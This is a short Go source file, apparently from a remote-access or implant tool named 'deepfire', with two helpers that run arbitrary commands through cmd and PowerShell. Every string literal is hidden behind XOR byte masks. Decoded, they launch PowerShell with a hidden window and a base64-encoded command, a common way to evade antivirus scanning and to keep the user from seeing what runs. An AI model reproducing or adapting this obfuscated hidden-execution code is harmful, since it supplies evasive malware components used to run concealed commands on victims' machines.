package deepfire

import (
	"fmt"
	"os/exec"
)

func cmdOut(command string) (string, error) {
	cmd := exec.Command((func() string {
mask := []byte("\xf5\xdd\xac")
maskedStr := []byte("\x96\xb0\xc8")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x84\x87")
maskedStr := []byte("\xab\xc4")
res := make([]byte, 2)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), command)
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.CombinedOutput()
	out := string(output)
	return out, err
}

func pwsh(command string) (string, error) {
	binary, _ := exec.LookPath((func() string {
mask := []byte("\x7a\x48\x8c\xaf\xbd\x6d\xdc\x08\x0f\x1d")
maskedStr := []byte("\x0a\x27\xfb\xca\xcf\x1e\xb4\x6d\x63\x71")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
	_cmd := exec.Command(binary, fmt.Sprintf((func() string {
mask := []byte("\xfd\xc9\xc4\xad\x25\x6f\x47\x56\x20\x46\xfc\x40\x54\xf5\x9b\x5b\xe5\x46\x5e\x75\xe6\xe0\xaa\x60\xc8\xeb\x2e\xe5\xd4\xcd\x26\x50\xa8\x1c\xce\xe3\x55\x07\xa1\x1a\x37\x90\x71\xc7\x51\xf7\x1f\xdf\x0d\xfe\xb3")
maskedStr := []byte("\xad\xa6\xb3\xc8\x57\x3c\x2f\x33\x4c\x2a\xdc\x6d\x03\x9c\xf5\x3f\x8a\x31\x0d\x01\x9f\x8c\xcf\x40\xa0\x82\x4a\x81\xb1\xa3\x06\x7d\xcd\x72\xad\x8c\x31\x62\xc5\x59\x58\xfd\x1c\xa6\x3f\x93\x3f\xfd\x28\x8d\x91")
res := make([]byte, 51)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), command))
	output, err := _cmd.CombinedOutput()
	return string(output), err
}
